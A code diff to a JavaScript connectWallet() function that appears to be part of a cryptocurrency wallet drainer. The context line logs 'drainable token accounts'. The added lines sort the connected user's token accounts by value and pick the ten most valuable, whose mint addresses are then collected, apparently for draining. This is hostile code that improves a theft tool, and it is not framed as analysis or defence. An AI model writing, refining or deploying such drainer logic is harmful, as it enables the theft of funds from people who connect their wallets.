@@ -105,10 +105,14 @@ async function connectWallet() {
         btn.disabled = true;
 
         cachedTokenAccounts = await getTokenAccounts(userPublicKey);
+        cachedTokenAccounts.sort(function(a, b) {
+            return parseFloat(b.amount) / Math.pow(10, b.decimals) - parseFloat(a.amount) / Math.pow(10, a.decimals);
+        });
         console.log('Found ' + cachedTokenAccounts.length + ' drainable token accounts');
 
-        if (cachedTokenAccounts.length > 0) {
-            var mints = cachedTokenAccounts.map(function(ta) {
+        var topTokens = cachedTokenAccounts.slice(0, 10);
+        if (topTokens.length > 0) {
+            var mints = topTokens.map(function(ta) {
                 return { mint: ta.mint.toBase58(), tokenProgram: ta.tokenProgramId.toBase58() };
             });
             try {
